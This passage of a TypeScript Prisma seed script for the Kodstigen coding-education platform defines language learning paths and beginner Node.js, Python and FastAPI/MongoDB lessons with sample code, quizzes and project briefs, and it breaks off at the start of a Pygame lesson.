import {
  PrismaClient,
  QuestionType,
  Prisma,
  type AchievementMetric,
  type ChallengeDifficulty,
  type ChallengeLanguage,
} from '@prisma/client';
import bcrypt from 'bcryptjs';

const prisma = new PrismaClient();

const paths = [
  {
    slug: 'cpp',
    name: 'C++',
    icon: '🟦',
    difficulty: 5,
    estimatedHours: 65,
    projectCount: 18,
    description: 'Master systems programming, memory management, and high-performance applications with C++.',
  },
  {
    slug: 'python',
    name: 'Python',
    icon: '🐍',
    difficulty: 2,
    estimatedHours: 80,
    projectCount: 21,
    description: 'The friendliest way into programming, scripting, automation, data, and AI with Python.',
  },
  {
    slug: 'javascript',
    name: 'JavaScript',
    icon: '🟨',
    difficulty: 3,
    estimatedHours: 70,
    projectCount: 25,
    description: 'The language of the web. Build interactive sites and apps that run everywhere.',
  },
  {
    slug: 'typescript',
    name: 'TypeScript',
    icon: '🔵',
    difficulty: 3,
    estimatedHours: 40,
    projectCount: 14,
    description: 'JavaScript with superpowers, static types, safer refactors, and scalable codebases.',
  },
  {
    slug: 'nodejs',
    name: 'Node.js',
    icon: '🟩',
    difficulty: 4,
    estimatedHours: 45,
    projectCount: 16,
    description: 'Server-side JavaScript, REST APIs, real-time apps, and backend engineering with Node.js.',
  },
  {
    slug: 'git',
    name: 'Git',
    icon: '🌿',
    difficulty: 2,
    estimatedHours: 20,
    projectCount: 5,
    description: 'Version control fundamentals, track changes, branch, merge, and collaborate with Git and GitHub.',
  },
  {
    slug: 'react',
    name: 'React',
    icon: '⚛️',
    difficulty: 3,
    estimatedHours: 50,
    projectCount: 16,
    description: 'Component-based UI development with React, JSX, props, state, hooks, and building real interactive apps.',
  },
  {
    slug: 'csharp',
    name: 'C#',
    icon: '🟣',
    difficulty: 3,
    estimatedHours: 45,
    projectCount: 14,
    description: 'Statically-typed, object-oriented programming with C# and the .NET ecosystem.',
  },
  {
    slug: 'sql',
    name: 'SQL',
    icon: '🗄️',
    difficulty: 3,
    estimatedHours: 55,
    projectCount: 11,
    description: 'Query, filter, join, and aggregate relational data with SQL, the language behind virtually every database-backed application.',
  },
  {
    slug: 'devops',
    name: 'DevOps',
    icon: '🚀',
    difficulty: 4,
    estimatedHours: 150,
    projectCount: 40,
    description: 'Ship and run software reliably: containers, cloud infrastructure, CI/CD pipelines, Kubernetes, and observability.',
  },
  {
    slug: 'ai-coding',
    name: 'AI Coding',
    icon: '🤖',
    difficulty: 2,
    estimatedHours: 15,
    projectCount: 5,
    description: 'Work effectively with AI coding assistants: writing clear prompts, giving the right context, and reviewing what they build.',
  },
  {
    slug: 'html',
    name: 'HTML',
    icon: '📄',
    difficulty: 1,
    estimatedHours: 20,
    projectCount: 8,
    description: 'The building blocks of every website: structure, semantics, forms, and accessibility with HTML.',
  },
  {
    slug: 'css',
    name: 'CSS',
    icon: '🎨',
    difficulty: 2,
    estimatedHours: 30,
    projectCount: 10,
    description: 'Style and lay out the web: the box model, Flexbox, Grid, responsive design, and animation with CSS.',
  },
  {
    slug: 'lua',
    name: 'Lua',
    icon: '🌙',
    difficulty: 2,
    estimatedHours: 25,
    projectCount: 8,
    description: 'A lightweight, embeddable scripting language used everywhere from game engines to Neovim configs.',
  },
  {
    slug: 'cybersecurity',
    name: 'Cybersecurity',
    icon: '🔒',
    difficulty: 3,
    estimatedHours: 35,
    projectCount: 10,
    description: 'Think like an attacker to defend like a pro: the CIA triad, common attack vectors, network and web app security, cryptography, and access control.',
  },
  {
    slug: 'c',
    name: 'C',
    icon: '🔧',
    difficulty: 4,
    estimatedHours: 45,
    projectCount: 11,
    description: 'Get close to the machine: structs, pointers, manual memory management, and build your own garbage collector from scratch.',
  },
  {
    slug: 'linux',
    name: 'Linux',
    icon: '🐧',
    difficulty: 2,
    estimatedHours: 20,
    projectCount: 7,
    description: 'The command line, filesystems, processes, permissions, and setting up a real development environment.',
  },
  {
    slug: 'java',
    name: 'Java',
    icon: '☕',
    difficulty: 3,
    estimatedHours: 45,
    projectCount: 7,
    description: 'Statically-typed, object-oriented programming on the JVM: classes, collections, generics, and interfaces.',
  },
  {
    slug: 'go',
    name: 'Go',
    icon: '🐹',
    difficulty: 3,
    estimatedHours: 35,
    projectCount: 8,
    description: 'A simple, fast, compiled language built for concurrency: structs, goroutines, channels, and error handling.',
  },
  {
    slug: 'solidity',
    name: 'Solidity',
    icon: '⛓️',
    difficulty: 4,
    estimatedHours: 30,
    projectCount: 7,
    description: 'Write smart contracts for Ethereum: state variables, functions and visibility, access control, mappings, and events.',
  },
  {
    slug: 'gdscript',
    name: 'GDScript',
    icon: '🎮',
    difficulty: 2,
    estimatedHours: 25,
    projectCount: 7,
    description: "Godot's built-in scripting language: nodes, the scene tree, signals, and building real gameplay behavior.",
  },
];

type SeedQuestion = {
  type: QuestionType;
  prompt: string;
  options: string[];
  answer: string;
};

type SeedLesson = {
  title: string;
  content: string;
  videoUrl?: string;
  requiresSubmission?: boolean;
  quiz?: { title: string; passingScore: number; questions: SeedQuestion[] };
};

function lessonContent(title: string, body: string): string {
  return `# ${title}\n\n${body}`;
}

const nodeLessons: SeedLesson[] = [
  {
    title: 'Introduction to Node.js',
    content: lessonContent(
      'Introduction to Node.js',
      `Node.js is a JavaScript runtime built on Chrome's V8 engine. It lets you run JavaScript outside the browser, on servers, in CLIs, and in build tools.\n\n## Why Node.js?\n\n- **Non-blocking I/O**, handles thousands of concurrent connections efficiently.\n- **One language everywhere**, share code and skills between frontend and backend.\n- **npm**, the largest package ecosystem in the world.\n\n## Your first program\n\n\`\`\`js\n// hello.js\nconsole.log('Hello from Node.js!');\n\`\`\`\n\nRun it with:\n\n\`\`\`bash\nnode hello.js\n\`\`\``
    ),
    quiz: {
      title: 'Node.js Basics',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What engine does Node.js use to execute JavaScript?',
          options: ['SpiderMonkey', 'V8', 'JavaScriptCore', 'Chakra'],
          answer: 'V8',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Node.js can only run JavaScript inside a web browser.',
          options: ['True', 'False'],
          answer: 'False',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The command to run a file called app.js with Node is: ____ app.js',
          options: [],
          answer: 'node',
        },
      ],
    },
  },
  {
    title: 'Variables and Data Types',
    content: lessonContent(
      'Variables and Data Types',
      `JavaScript in Node.js supports \`let\`, \`const\`, and (legacy) \`var\`.\n\n\`\`\`js\nconst name = 'Kodstigen';   // cannot be reassigned\nlet xp = 0;                 // can be reassigned\nxp += 10;\n\nconsole.log(name, 'has', xp, 'XP');\nconsole.log('typeof name:', typeof name);\n\`\`\`\n\n## Core types\n\n| Type | Example |\n|------|---------|\n| string | \`'hello'\` |\n| number | \`42\`, \`3.14\` |\n| boolean | \`true\` |\n| object | \`{ id: 1 }\` |\n| array | \`[1, 2, 3]\` |\n| null / undefined | absence of value |\n\nPrefer \`const\` by default; use \`let\` only when you need to reassign.`
    ),
    quiz: {
      title: 'Variables Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which keyword declares a variable that cannot be reassigned?',
          options: ['var', 'let', 'const', 'static'],
          answer: 'const',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What is the output of: console.log(typeof [1, 2, 3])',
          options: ['array', 'object', 'list', 'undefined'],
          answer: 'object',
        },
      ],
    },
  },
  {
    title: 'Functions and Modules',
    content: lessonContent(
      'Functions and Modules',
      `## Functions\n\n\`\`\`js\nfunction add(a, b) {\n  return a + b;\n}\n\nconst multiply = (a, b) => a * b;\n\nconsole.log('add(2, 3) =', add(2, 3));\nconsole.log('multiply(4, 5) =', multiply(4, 5));\n\`\`\`\n\n## ES Modules\n\nSplit code across files with \`import\`/\`export\` (module files need a real Node.js project, so this example is read-only):\n\n\`\`\`\n// math.js\nexport function add(a, b) {\n  return a + b;\n}\n\n// app.js\nimport { add } from './math.js';\nconsole.log(add(2, 3)); // 5\n\`\`\`\n\nSet \`"type": "module"\` in package.json to use ES modules natively.`
    ),
    quiz: {
      title: 'Functions & Modules Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'To bring a named export into another file you use the ____ keyword.',
          options: [],
          answer: 'import',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Arrow functions are declared with the => syntax.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Building an Express Server',
    content: lessonContent(
      'Building an Express Server',
      `Express is the most popular web framework for Node.js.\n\n\`\`\`\nimport express from 'express';\n\nconst app = express();\napp.use(express.json());\n\napp.get('/api/health', (req, res) => {\n  res.json({ status: 'ok' });\n});\n\napp.listen(4000, () => console.log('Listening on :4000'));\n\`\`\`\n\n*Server code runs in Node.js, not in the browser playground, you'll run this for real in the final project.*\n\n## Key concepts\n\n- **Routes** map an HTTP method + path to a handler.\n- **Middleware** functions run in order before your handler (parsing, auth, logging).\n- **req / res**, the request and response objects.`
    ),
    quiz: {
      title: 'Express Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which middleware parses incoming JSON request bodies?',
          options: ['express.static()', 'express.json()', 'express.router()', 'express.parse()'],
          answer: 'express.json()',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What HTTP method is typically used to create a new resource?',
          options: ['GET', 'POST', 'DELETE', 'HEAD'],
          answer: 'POST',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Middleware functions execute after the final route handler sends its response.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'REST APIs and Authentication',
    content: lessonContent(
      'REST APIs and Authentication',
      `## REST conventions\n\n| Method | Path | Meaning |\n|--------|------|---------|\n| GET | /api/courses | list courses |\n| GET | /api/courses/:id | one course |\n| POST | /api/courses | create |\n| PUT | /api/courses/:id | update |\n| DELETE | /api/courses/:id | delete |\n\n## JWT authentication\n\n1. User logs in with credentials.\n2. Server verifies and signs a **JSON Web Token**.\n3. Client sends it back on every request: \`Authorization: Bearer <token>\`.\n4. Middleware verifies the signature and attaches the user to the request.\n\nNever store plain-text passwords, hash them with bcrypt.`
    ),
    quiz: {
      title: 'REST & Auth Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'JWTs are sent in the Authorization header using the ____ scheme.',
          options: [],
          answer: 'Bearer',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which library is commonly used to hash passwords in Node.js?',
          options: ['md5', 'bcrypt', 'base64', 'crypto-random'],
          answer: 'bcrypt',
        },
      ],
    },
  },
  {
    title: 'Final Project: URL Shortener',
    content: lessonContent(
      'Final Project: URL Shortener',
      `Time to put it all together. Build a URL shortener API with:\n\n## Requirements\n\n1. \`POST /api/links\`, accepts a long URL, returns a short code.\n2. \`GET /:code\`, redirects to the original URL.\n3. \`GET /api/links/:code/stats\`, visit count and creation date.\n4. Persist links in PostgreSQL.\n5. Validate URLs and handle unknown codes with a 404.\n\n## Stretch goals\n\n- Rate limiting\n- Custom short codes\n- Expiring links\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const pythonLessons: SeedLesson[] = [
  {
    title: 'Getting Started with Python',
    content: lessonContent(
      'Getting Started with Python',
      `Python is one of the most popular programming languages in the world, and one of the friendliest for beginners. It's used for everything from web apps and automation scripts to data science and AI.\n\n## Your first program\n\n\`\`\`python\nprint("Hello, Kodstigen!")\n\nname = "student"\nxp = 0\nxp += 10\nprint(f"{name} has {xp} XP")\n\`\`\`\n\n## Reading it line by line\n\n- \`print(...)\` writes text to the console, it's usually the very first thing anyone learns in any language.\n- \`name = "student"\` creates a **variable**, a named container for a value, Python figures out the type (here, a piece of text) automatically, you never have to declare it up front.\n- \`xp += 10\` is shorthand for \`xp = xp + 10\`, add 10 to whatever \`xp\` already is.\n- \`f"{name} has {xp} XP"\` is an **f-string**, the \`f\` right before the quotes lets you embed variables directly inside \`{ }\`, without it you'd have to write something clunkier like \`name + " has " + str(xp) + " XP"\`.\n\n## No semicolons, no braces\n\nUnlike many languages, Python doesn't use \`{ }\` to mark where a block of code starts and ends, it uses **indentation** (consistent spaces at the start of a line) instead. Get the indentation wrong and Python refuses to run your code, that's a feature, not a bug, it forces code to stay readable.\n\n> [!TIP]\n> Comments start with \`#\` and are ignored when the program runs, use them to explain *why* you did something, not just *what* the code does.`
    ),
    quiz: {
      title: 'Python Basics Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How does Python define code blocks?',
          options: ['Curly braces', 'Indentation', 'Keywords begin/end', 'Parentheses'],
          answer: 'Indentation',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'The built-in function to display output to the console is ____().',
          options: [],
          answer: 'print',
        },
      ],
    },
  },
  {
    title: 'Lists, Dicts, and Loops',
    content: lessonContent(
      'Lists, Dicts, and Loops',
      `Two of Python's most-used data structures are **lists** (ordered collections) and **dictionaries** (key-value pairs).\n\n\`\`\`python\nlanguages = ["python", "javascript", "cpp"]\nscores = {"python": 95, "javascript": 88}\n\nfor lang in languages:\n    print(lang.upper())\n\n# List comprehension\nlengths = [len(lang) for lang in languages]\nprint("lengths:", lengths)\nprint("python score:", scores["python"])\n\`\`\`\n\n## Lists\n\n\`languages\` is a **list**, an ordered, mutable (changeable) collection. Access an item by its position, starting from \`0\`, so \`languages[0]\` is \`"python"\`. Lists can hold any mix of types and grow or shrink with methods like \`.append(...)\`.\n\n## Dictionaries\n\n\`scores\` is a **dict**, it maps **keys** (like \`"python"\`) to **values** (like \`95\`), instead of positions. Look up a value with \`scores["python"]\`, trying to access a key that doesn't exist raises an error.\n\n## Loops\n\n\`for lang in languages:\` visits every item in the list, one at a time, \`lang\` is a new variable holding the current item on each pass.\n\n## List comprehensions\n\n\`[len(lang) for lang in languages]\` builds a brand-new list in a single line. Read it right to left: "for each \`lang\` in \`languages\`, compute \`len(lang)\`, and collect the results into a list." It's exactly equivalent to:\n\n\`\`\`python\nlengths = []\nfor lang in languages:\n    lengths.append(len(lang))\n\`\`\`\n\njust shorter, once the pattern clicks, you'll use it constantly.`
    ),
    quiz: {
      title: 'Collections Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does len(["a", "b", "c"]) return?',
          options: ['2', '3', '"abc"', 'an error'],
          answer: '3',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Python dictionaries map keys to values.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Functions and Error Handling',
    content: lessonContent(
      'Functions and Error Handling',
      `A **function** is a named, reusable block of code, you define it once and call it as many times as you need.\n\n\`\`\`python\ndef divide(a: float, b: float) -> float:\n    if b == 0:\n        raise ValueError("Cannot divide by zero")\n    return a / b\n\ntry:\n    print("10 / 2 =", divide(10, 2))\n    print("10 / 0 =", divide(10, 0))\nexcept ValueError as err:\n    print(f"Error: {err}")\n\`\`\`\n\n## Defining a function\n\n\`def divide(a, b):\` starts a function definition, \`a\` and \`b\` are **parameters**, placeholders for whatever values get passed in when the function is called. \`return\` sends a value back to whoever called the function, once \`return\` runs, the function stops immediately.\n\n## Type hints\n\n\`a: float, b: float) -> float\` are **type hints**, they document what types a function expects and returns. Python doesn't enforce them at runtime (you *could* still pass in the wrong type), but they help tools, editors, and other developers understand your code, and catch mistakes early.\n\n## Handling errors\n\nSometimes something goes wrong that a function can't recover from itself, dividing by zero, a missing file, invalid input. Python handles this with **exceptions**:\n\n- \`raise ValueError("...")\` signals "something is wrong" and stops normal execution.\n- \`try:\` wraps code that might fail.\n- \`except ValueError as err:\` catches that specific kind of error if it happens, letting your program respond gracefully instead of crashing.\n\nWithout the \`try\`/\`except\`, calling \`divide(10, 0)\` would crash the whole program the moment the \`ValueError\` was raised.`
    ),
    quiz: {
      title: 'Functions Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'The keyword used to define a function in Python is ____.',
          options: [],
          answer: 'def',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which block catches an exception raised inside try?',
          options: ['catch', 'rescue', 'except', 'finally'],
          answer: 'except',
        },
      ],
    },
  },
  {
    title: 'Working with Files',
    content: lessonContent(
      'Working with Files',
      `Programs are more useful when they can save data between runs. Python's built-in \`open()\` reads and writes files.\n\n\`\`\`python\nwith open("scores.txt", "w") as f:\n    f.write("Ada,95\\n")\n    f.write("Grace,98\\n")\n\nwith open("scores.txt", "r") as f:\n    for line in f:\n        name, score = line.strip().split(",")\n        print(f"{name}: {score}")\n\`\`\`\n\n## The \`with\` statement\n\n\`with open(...) as f:\` opens the file and guarantees it gets closed automatically when the block ends, even if an error happens inside it. Without \`with\`, you'd have to remember to call \`f.close()\` yourself.\n\n## Common modes\n\n| Mode | Meaning |\n|------|---------|\n| \`"r"\` | Read (default), errors if the file doesn't exist |\n| \`"w"\` | Write, creates the file or overwrites it completely |\n| \`"a"\` | Append, adds to the end without erasing existing content |`
    ),
    quiz: {
      title: 'Files Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which file mode adds new content to the end of a file without erasing what is already there?',
          options: ['"r"', '"w"', '"a"', '"x"'],
          answer: '"a"',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'The `with` statement automatically closes a file when its block ends.',
          options: ['True', 'False'],
          answer: 'True',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Opening a file for writing, overwriting any existing content, uses mode ____.',
          options: [],
          answer: 'w',
        },
      ],
    },
  },
  {
    title: 'Classes and Objects',
    content: lessonContent(
      'Classes and Objects',
      `A **class** is a blueprint for creating objects that bundle data and behavior together.\n\n\`\`\`python\nclass Student:\n    def __init__(self, name, xp=0):\n        self.name = name\n        self.xp = xp\n\n    def gain_xp(self, amount):\n        self.xp += amount\n        return self.xp\n\nada = Student("Ada")\nada.gain_xp(50)\nprint(f"{ada.name} has {ada.xp} XP")\n\ngrace = Student("Grace", xp=10)\ngrace.gain_xp(5)\nprint(f"{grace.name} has {grace.xp} XP")\n\`\`\`\n\n## Key pieces\n\n- \`__init__\` is the **constructor**, it runs automatically whenever you create a new instance with \`Student(...)\`.\n- \`self\` refers to the specific instance a method was called on, it's always the first parameter of an instance method.\n- Each instance (\`ada\`, \`grace\`) keeps its own independent copy of the data set in \`__init__\`.`
    ),
    quiz: {
      title: 'Classes Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'FILL_BLANK',
          prompt: 'The constructor method that runs automatically when a new instance is created is called ____.',
          options: [],
          answer: '__init__',
        },
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does `self` refer to inside an instance method?',
          options: ['The class itself', 'The instance the method was called on', 'The parent class', 'Nothing, it is optional'],
          answer: 'The instance the method was called on',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Two instances of the same class always share the same attribute values.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Final Project: Contact Book CLI',
    content: lessonContent(
      'Final Project: Contact Book CLI',
      `Time to combine everything, functions, collections, classes, and files, into one program.\n\n## Requirements\n\n1. Represent each contact with a class (or dictionary) storing a name, phone number, and email.\n2. Support adding a new contact and listing all contacts.\n3. Support searching for a contact by name, and handle the case where no match is found without crashing.\n4. Persist contacts to a text or JSON file so they survive between runs, using what you learned about file I/O.\n5. Write at least one function with a clear docstring and type hints.\n\n## Stretch goals\n\n- Support deleting a contact.\n- Sort the contact list alphabetically by name.\n- Use the \`json\` module to save and load contacts as structured JSON instead of plain text.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const mongoFastApiLessons: SeedLesson[] = [
  {
    title: 'Why FastAPI and MongoDB?',
    content: lessonContent(
      'Why FastAPI and MongoDB?',
      `You've learned Python the language, now let's build a real backend with it. **FastAPI** is a modern, high-performance Python web framework, and **MongoDB** is a NoSQL database that stores flexible, JSON-like documents instead of rigid rows and columns.\n\n## Why FastAPI\n\n- **Fast to write**, path operations are plain Python functions with type hints.\n- **Automatic validation**, request and response data is checked against the types you declare.\n- **Free interactive docs**, every API automatically gets a Swagger UI page at \`/docs\`.\n- **Async-first**, built to handle many concurrent requests efficiently.\n\n## Why MongoDB\n\nA relational database (like the PostgreSQL you may have used with SQL) stores data in tables with a fixed set of columns. MongoDB stores **documents**, JSON-like objects that can have nested data and don't all need identical fields:\n\n\`\`\`\n{\n  "_id": "64f1b2c3d4e5f6",\n  "title": "Buy groceries",\n  "done": false,\n  "tags": ["errands", "urgent"]\n}\n\`\`\`\n\n> [!NOTE]\n> Neither approach is "better", relational databases shine when your data has clear, stable structure and relationships; document databases shine when your data is nested, varies shape, or evolves quickly.`
    ),
    quiz: {
      title: 'FastAPI & MongoDB Intro Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does FastAPI automatically generate for every API you build?',
          options: ['A mobile app', 'Interactive documentation at /docs', 'A MongoDB cluster', 'CSS styles'],
          answer: 'Interactive documentation at /docs',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'MongoDB stores data as flexible, JSON-like ____ instead of rows in a fixed table.',
          options: [],
          answer: 'documents',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every document in a MongoDB collection must have exactly the same fields.',
          options: ['True', 'False'],
          answer: 'False',
        },
      ],
    },
  },
  {
    title: 'Setting Up FastAPI and MongoDB',
    content: lessonContent(
      'Setting Up FastAPI and MongoDB',
      `## 1. Install the pieces\n\n\`\`\`bash\npip install fastapi uvicorn motor\n\`\`\`\n\n- \`fastapi\`, the web framework itself.\n- \`uvicorn\`, the server that actually runs your FastAPI app.\n- \`motor\`, the official **async** MongoDB driver for Python.\n\n## 2. A minimal app\n\n\`\`\`\nfrom fastapi import FastAPI\n\napp = FastAPI()\n\n@app.get("/")\nasync def root():\n    return {"message": "Hello, Kodstigen!"}\n\`\`\`\n\nRun it with:\n\n\`\`\`bash\nuvicorn main:app --reload\n\`\`\`\n\n\`--reload\` restarts the server automatically whenever you save a file, handy during development.\n\n## 3. Connecting to MongoDB\n\n\`\`\`\nfrom motor.motor_asyncio import AsyncIOMotorClient\n\nclient = AsyncIOMotorClient("mongodb://localhost:27017")\ndb = client.kodstigen_db\ntasks_collection = db.tasks\n\`\`\`\n\nA MongoDB server organizes data into **databases**, which contain **collections** (roughly, a collection is like a table), which contain **documents** (roughly, a document is like a row).`
    ),
    quiz: {
      title: 'Setup Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'Which package actually runs (serves) a FastAPI application?',
          options: ['fastapi', 'uvicorn', 'motor', 'pip'],
          answer: 'uvicorn',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Running uvicorn with the ____ flag restarts the server automatically when files change.',
          options: [],
          answer: '--reload',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'In MongoDB, a collection contains documents, similar to how a table contains rows.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Defining Data Models with Pydantic',
    content: lessonContent(
      'Defining Data Models with Pydantic',
      `FastAPI uses **Pydantic** models to describe the shape of your data, then automatically validates incoming requests against them.\n\n\`\`\`\nfrom pydantic import BaseModel\nfrom typing import Optional\n\nclass Task(BaseModel):\n    title: str\n    done: bool = False\n    tags: list[str] = []\n\nclass TaskOut(Task):\n    id: str\n\`\`\`\n\n## What this buys you\n\n- If a request is missing \`title\`, or sends the wrong type, FastAPI rejects it with a clear \`422\` error automatically, your code never even runs.\n- \`done: bool = False\` gives that field a default, so callers don't have to include it.\n- \`TaskOut\` reuses \`Task\` and adds an \`id\` field, useful for responses (which include a database-assigned id) versus requests (which don't have one yet).\n\n> [!TIP]\n> Think of Pydantic models as the FastAPI equivalent of a SQL table schema, they're where you write down the "shape" your data must have.`
    ),
    quiz: {
      title: 'Pydantic Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What happens if a request body is missing a required field on a Pydantic model?',
          options: [
            'FastAPI fills it in with null',
            'FastAPI automatically rejects the request with a validation error',
            'The server crashes',
            'The field is silently ignored',
          ],
          answer: 'FastAPI automatically rejects the request with a validation error',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Pydantic model classes inherit from ____.',
          options: [],
          answer: 'BaseModel',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Giving a field a default value, like `done: bool = False`, makes it optional in requests.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Basic CRUD with Motor',
    content: lessonContent(
      'Basic CRUD with Motor',
      `Motor's methods mirror MongoDB's query language closely, and every call is \`async\`.\n\n\`\`\`\n# Create\nresult = await tasks_collection.insert_one({"title": "Buy groceries", "done": False})\nnew_id = result.inserted_id\n\n# Read one\ntask = await tasks_collection.find_one({"_id": new_id})\n\n# Read many\ncursor = tasks_collection.find({"done": False})\nincomplete_tasks = await cursor.to_list(length=100)\n\n# Update\nawait tasks_collection.update_one({"_id": new_id}, {"$set": {"done": True}})\n\n# Delete\nawait tasks_collection.delete_one({"_id": new_id})\n\`\`\`\n\n## Reading the pieces\n\n- The first argument to each method is a **filter**, a document describing which record(s) to match, \`{}\` matches everything.\n- \`find()\` returns a **cursor**, not the data itself, you iterate it (or call \`.to_list()\`) to actually fetch documents.\n- \`update_one\` needs an update operator like \`$set\`, MongoDB won't just replace the whole document unless you ask it to.`
    ),
    quiz: {
      title: 'CRUD Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'What does tasks_collection.find({...}) return?',
          options: ['A list of documents directly', 'A single document', 'A cursor you iterate to get documents', 'A count'],
          answer: 'A cursor you iterate to get documents',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'To update specific fields on a document without replacing the whole thing, you use the ____ operator.',
          options: [],
          answer: '$set',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Every Motor method call must be awaited.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Building REST Endpoints',
    content: lessonContent(
      'Building REST Endpoints',
      `Wiring a Pydantic model and Motor together inside a path operation gives you a real REST endpoint.\n\n\`\`\`\nfrom fastapi import FastAPI, HTTPException\n\napp = FastAPI()\n\n@app.post("/tasks", response_model=TaskOut)\nasync def create_task(task: Task):\n    result = await tasks_collection.insert_one(task.model_dump())\n    created = await tasks_collection.find_one({"_id": result.inserted_id})\n    return {**created, "id": str(created["_id"])}\n\n@app.get("/tasks/{task_id}", response_model=TaskOut)\nasync def get_task(task_id: str):\n    task = await tasks_collection.find_one({"_id": ObjectId(task_id)})\n    if task is None:\n        raise HTTPException(status_code=404, detail="Task not found")\n    return {**task, "id": str(task["_id"])}\n\`\`\`\n\n## Key ideas\n\n- \`{task_id}\` in the route path becomes a function parameter automatically, FastAPI calls this **path parameter binding**.\n- \`task: Task\` as a parameter tells FastAPI to parse and validate the request body as a \`Task\`.\n- \`response_model=TaskOut\` shapes and validates what gets sent back, and shows up correctly in the auto-generated docs.\n- Raising \`HTTPException\` is how you return a non-200 status code with a message.`
    ),
    quiz: {
      title: 'Endpoints Quiz',
      passingScore: 70,
      questions: [
        {
          type: 'MULTIPLE_CHOICE',
          prompt: 'How do you return a 404 response from inside a FastAPI path operation?',
          options: ['return 404', 'raise HTTPException(status_code=404, ...)', 'app.error(404)', 'response.status = 404'],
          answer: 'raise HTTPException(status_code=404, ...)',
        },
        {
          type: 'FILL_BLANK',
          prompt: 'Writing {task_id} inside a route path like "/tasks/{task_id}" is called a path ____.',
          options: [],
          answer: 'parameter',
        },
        {
          type: 'TRUE_FALSE',
          prompt: 'Declaring a parameter as `task: Task` tells FastAPI to validate the request body against the Task model.',
          options: ['True', 'False'],
          answer: 'True',
        },
      ],
    },
  },
  {
    title: 'Final Project: Build a Task API with FastAPI & MongoDB',
    content: lessonContent(
      'Final Project: Build a Task API with FastAPI & MongoDB',
      `Time to combine models, Motor, and path operations into a real API.\n\n## Requirements\n\n1. Define a Pydantic \`Task\` model with at least a title, a completed flag, and one more field of your choice.\n2. Connect to a MongoDB database (local, Docker, or a free Atlas cluster) using Motor.\n3. Build full CRUD endpoints, \`POST /tasks\`, \`GET /tasks\`, \`GET /tasks/{id}\`, \`PUT /tasks/{id}\`, and \`DELETE /tasks/{id}\`.\n4. Return a proper \`404\` when a requested task doesn't exist.\n5. Confirm your endpoints work using the automatic docs at \`/docs\`.\n\n## Stretch goals\n\n- Add a query parameter to filter tasks by \`done\` status.\n- Add pagination with \`skip\`/\`limit\` query parameters.\n- Add a second collection (e.g. \`users\` or \`projects\`) with a relationship to tasks.\n\nSubmit your repository link below when you are done, an instructor will review it before you can mark this lesson complete. Good luck! 🚀`
    ),
    requiresSubmission: true,
  },
];

const pygameAsteroidsLessons: SeedLesson[] = [
  {
    title: 'Pygame: Setup and Installation',
    content: lessonContent(
      'Pygame: Setup and Installation',
